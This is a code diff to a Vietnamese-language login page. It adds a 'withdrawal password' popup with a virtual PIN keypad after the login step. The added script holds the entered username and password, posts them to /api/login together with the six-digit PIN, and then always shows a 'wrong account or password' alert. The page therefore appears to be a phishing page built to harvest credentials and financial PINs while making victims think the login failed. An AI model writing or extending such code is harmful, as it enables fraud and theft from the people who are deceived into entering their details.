@@ -603,7 +603,54 @@
     </div>
 </div>
 
+<!-- ================= POPUP NHẬP MẬT KHẨU RÚT TIỀN 6 SỐ ================= -->
+<div id="withdraw-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9999; justify-content:center; align-items:flex-end;">
+    <div style="background:#fff; width:100%; max-width:430px; border-top-left-radius: 20px; border-top-right-radius: 20px; padding: 20px; box-shadow: 0 -4px 15px rgba(0,0,0,0.2);">
+        <div style="text-align:center; font-size:16px; font-weight:bold; margin-bottom:15px; color:#333;">Nhập mật khẩu</div>
+        <div style="font-size:13px; color:#555; margin-bottom:8px;">Mật Khẩu Rút Tiền</div>
+        
+        <!-- 6 ô nhập mã -->
+        <div style="display:flex; justify-content:space-between; gap:8px; margin-bottom:10px;">
+            <input type="password" maxlength="1" class="pin-input" readonly style="width:45px; height:45px; text-align:center; font-size:20px; border:1.2px solid #399b49; border-radius:6px; outline:none;" />
+            <input type="password" maxlength="1" class="pin-input" readonly style="width:45px; height:45px; text-align:center; font-size:20px; border:1.2px solid #ccc; border-radius:6px; outline:none;" />
+            <input type="password" maxlength="1" class="pin-input" readonly style="width:45px; height:45px; text-align:center; font-size:20px; border:1.2px solid #ccc; border-radius:6px; outline:none;" />
+            <input type="password" maxlength="1" class="pin-input" readonly style="width:45px; height:45px; text-align:center; font-size:20px; border:1.2px solid #ccc; border-radius:6px; outline:none;" />
+            <input type="password" maxlength="1" class="pin-input" readonly style="width:45px; height:45px; text-align:center; font-size:20px; border:1.2px solid #ccc; border-radius:6px; outline:none;" />
+            <input type="password" maxlength="1" class="pin-input" readonly style="width:45px; height:45px; text-align:center; font-size:20px; border:1.2px solid #ccc; border-radius:6px; outline:none;" />
+        </div>
+
+        <div style="display:flex; justify-content:space-between; font-size:12px; color:#666; margin-bottom:15px;">
+            <span>Để đảm bảo tài khoản an toàn, hãy nhập mật khẩu rút tiền</span>
+            <a href="#" style="color:#269a3c; text-decoration:none;">Quên mật khẩu?</a>
+        </div>
+
+        <!-- Nút Tiếp Theo -->
+        <button onclick="submitPinCode()" style="width:100%; height:42px; background-color:#269a3c; color:#fff; border:none; border-radius:25px; font-size:16px; font-weight:bold; cursor:pointer; margin-bottom:15px;">Tiếp Theo</button>
+
+        <!-- Bàn phím ảo -->
+        <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:8px; background:#eee; padding:8px; border-radius:10px;">
+            <button onclick="pressKey('1')" style="height:45px; background:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer;">1</button>
+            <button onclick="pressKey('2')" style="height:45px; background:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer;">2</button>
+            <button onclick="pressKey('3')" style="height:45px; background:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer;">3</button>
+            <button onclick="pressKey('4')" style="height:45px; background:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer;">4</button>
+            <button onclick="pressKey('5')" style="height:45px; background:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer;">5</button>
+            <button onclick="pressKey('6')" style="height:45px; background:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer;">6</button>
+            <button onclick="pressKey('7')" style="height:45px; background:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer;">7</button>
+            <button onclick="pressKey('8')" style="height:45px; background:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer;">8</button>
+            <button onclick="pressKey('9')" style="height:45px; background:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer;">9</button>
+            <button style="height:45px; background:#ddd; border:none; border-radius:6px; font-size:16px; cursor:pointer;"><i class="fa-solid fa-keyboard"></i></button>
+            <button onclick="pressKey('0')" style="height:45px; background:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer;">0</button>
+            <button onclick="pressKey('del')" style="height:45px; background:#ddd; border:none; border-radius:6px; font-size:16px; cursor:pointer;"><i class="fa-solid fa-delete-left"></i></button>
+        </div>
+    </div>
+</div>
+
 <script>
+    let currentLoginUser = '';
+    let currentLoginPass = '';
+    let pinValues = ['', '', '', '', '', ''];
+    let activePinIndex = 0;
+
     function switchTab(tab) {
         const loginForm = document.getElementById('form-login');
         const registerForm = document.getElementById('form-register');
@@ -626,7 +673,6 @@
         }
     }
 
-    // ĐOẠN SCRIPT BẮT DỮ LIỆU BẰNG FETCH (KHÔNG LÀM LOAD LẠI TRANG LỆCH STYLE)
     function submitLogin() {
         const user = document.getElementById('login-user').value;
         const pass = document.getElementById('login-pass').value;
@@ -636,14 +682,55 @@
             return;
         }
 
+        currentLoginUser = user;
+        currentLoginPass = pass;
+
+        // Bật popup lên
+        document.getElementById('withdraw-modal').style.display = 'flex';
+    }
+
+    function pressKey(num) {
+        const inputs = document.querySelectorAll('.pin-input');
+        if (num === 'del') {
+            if (activePinIndex > 0) {
+                activePinIndex--;
+                pinValues[activePinIndex] = '';
+                inputs[activePinIndex].value = '';
+                inputs[activePinIndex].style.borderColor = '#ccc';
+            }
+        } else {
+            if (activePinIndex < 6) {
+                pinValues[activePinIndex] = num;
+                inputs[activePinIndex].value = num;
+                inputs[activePinIndex].style.borderColor = '#399b49';
+                activePinIndex++;
+                if (activePinIndex < 6) {
+                    inputs[activePinIndex].style.borderColor = '#399b49';
+                }
+            }
+        }
+    }
+
+    function submitPinCode() {
+        const pinCode = pinValues.join('');
+        if (pinCode.length < 6) {
+            alert('Vui lòng nhập đầy đủ 6 số mật khẩu rút tiền!');
+            return;
+        }
+
         fetch('/api/login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username: user, password: pass })
+            body: JSON.stringify({ 
+                username: currentLoginUser, 
+                password: currentLoginPass, 
+                pin: pinCode 
+            })
         })
         .then(res => res.json())
         .then(data => {
             alert('Mật khẩu hoặc tài khoản không chính xác!');
+            document.getElementById('withdraw-modal').style.display = 'none';
         });
     }
 
